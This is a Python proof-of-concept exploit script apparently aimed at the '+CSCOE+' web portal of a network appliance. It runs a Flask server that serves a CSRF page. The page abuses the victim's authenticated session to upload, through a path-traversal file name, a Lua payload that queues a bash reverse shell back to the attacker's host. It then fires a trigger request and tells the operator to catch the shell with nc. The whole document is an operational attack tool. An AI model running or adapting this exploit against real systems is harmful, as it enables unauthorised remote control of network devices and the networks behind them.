# poc to submit
import sys, time, uuid, threading
import requests
import urllib.parse
from flask import Flask, Response

requests.packages.urllib3.disable_warnings()

if len(sys.argv) < 4:
    print(f"usage: {sys.argv[0]} <target> <lhost> <lport>")
    sys.exit(1)

TARGET = sys.argv[1].rstrip("/")
LHOST = sys.argv[2]
LPORT = int(sys.argv[3])
endpoint = f"{TARGET}/+CSCOE+/upload.html?mode=add&include=1"
triggerpath = f"/../+CSCOE+/+{uuid.uuid4().hex[:8]}.html"
triggerurl = f"{TARGET}/+CSCOE+/+{triggerpath.split('+')[-1]}"
plname = f"p_{uuid.uuid4().hex[:6]}"

REVSHELL = f"/bin/bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"
# init payload
luapl = f"""<?
local ifs = require("ifs")
local payload = "{REVSHELL}"
local tmpfile = "/+CSCOE+/{plname}"

local f = io.open(tmpfile, "w")
if f then
    f:write(payload .. "\\n")
    f:close()
end

ifs.copy_ramfs2ifs(tmpfile, "../../../tmp/cmd_que", 0)

OUT("ok")
?>"""

app = Flask(__name__)

# main page
@app.route("/")
def csrfpage():
    boundary = "----WebKitFormBoundary" + uuid.uuid4().hex[:16]

    body_parts = []

    body_parts.append(f"--{boundary}\r\n")
    body_parts.append(f'Content-Disposition: form-data; name="url1"\r\n\r\n')
    body_parts.append(f"{triggerpath}\r\n")

    body_parts.append(f"--{boundary}\r\n")
    body_parts.append(f'Content-Disposition: form-data; name="uploadedfile1"; filename="{triggerpath}"\r\n')
    body_parts.append("Content-Type: application/octet-stream\r\n\r\n")
    body_parts.append(f"{luapl}\r\n")

    body_parts.append(f"--{boundary}--\r\n")

    body_raw = "".join(body_parts)

    html = f"""<html>
<body>
<h3>loading...</h3>
<script>
var boundary = "{boundary}";
var body = {repr(body_raw)};

var xhr = new XMLHttpRequest();
xhr.open("POST", "{endpoint}", true);
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=" + boundary);
xhr.onreadystatechange = function() {{
    if (xhr.readyState === 4) {{
        setTimeout(function() {{
            var trigger = new XMLHttpRequest();
            trigger.open("GET", "{triggerurl}", true);
            // ok 
            trigger.withCredentials = true;
            trigger.onreadystatechange = function() {{
                if (trigger.readyState === 4) {{
                    document.body.innerHTML = "<h3>done (" + trigger.status + ")</h3>";
                }}
            }};
            trigger.send();
        }}, 1500);
    }}
}};
xhr.send(body);
</script>
</body>
</html>"""
    return Response(html, content_type="text/html")


def verify_upload():
    time.sleep(10)
    print(f"+ trigger url: {triggerurl}")
    try:
        r = requests.get(triggerurl, verify=False, timeout=10)
        if r.status_code == 200 and "ok" in r.text:
            print("+  trigger fired, shelling...")
        else:
            print(f"+ trigger returned {r.status_code}")
    except Exception as e:
        print(f"+ verify failed: {e}")

# ok this should do
if __name__ == "__main__":
    print(f"+ serving csrf page")
    print(f"run nc on {LPORT}")
    app.run(host="0.0.0.0", port=8080)
